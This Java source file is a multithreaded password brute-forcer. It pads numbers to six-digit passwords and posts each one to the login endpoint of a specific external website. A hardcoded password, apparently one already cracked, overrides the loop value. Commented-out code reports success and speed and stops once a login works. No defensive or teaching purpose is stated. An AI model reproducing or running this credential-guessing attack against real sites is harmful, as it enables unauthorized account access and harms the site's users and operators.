import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

public class ThreadTry implements Runnable{

	private static char []caps = {};
	private static AtomicInteger count = new AtomicInteger(0);
	private int start ;
	private int end ; 
	private Map<String,String> params = new HashMap<String, String>();
	
	public ThreadTry(int start, int end, Map<String, String> params) {
		super();
		this.start = start;
		this.end = end;
		this.params.putAll(params);;
	}

	static String padding(String str,int len){
		while(str.length()<len)str="0"+str;
		return str;
	}
	
	@Override
	public void run() {
		for (int i = start; i <= end; i++) {
			long ss = System.currentTimeMillis();
			String password = padding(i+"", 6);
			password = "505748";
			params.put("password", password);
			String s = new Post().doPost("http://www.ng717.com:88/user/login/dologin", params,
					"utf-8");
			System.out.println(s);
			/*HNSFDX status = JsonUtil.json2Object(s, HNSFDX.class);
			int speed = (int) (System.currentTimeMillis()-ss);
			if(status.getErrorMessage().equals("")){
				System.out.println(status);
				System.out.println(i);
				System.out.println(s);
				System.out.println("[Success] TIME: "+new Date().toLocaleString()+" try..."+count.getAndIncrement()+" --- password: "+password+" --- speed:"+(speed)+"t/s");
				System.exit(0);
			}else{
				System.out.println(s);
				System.out.println("[Failed] TIME: "+new Date().toLocaleString()+" try..."+count.getAndIncrement()+" --- password: "+password+" --- speed:"+(speed)+"t/s");
			}
			*/
		}
	}

}
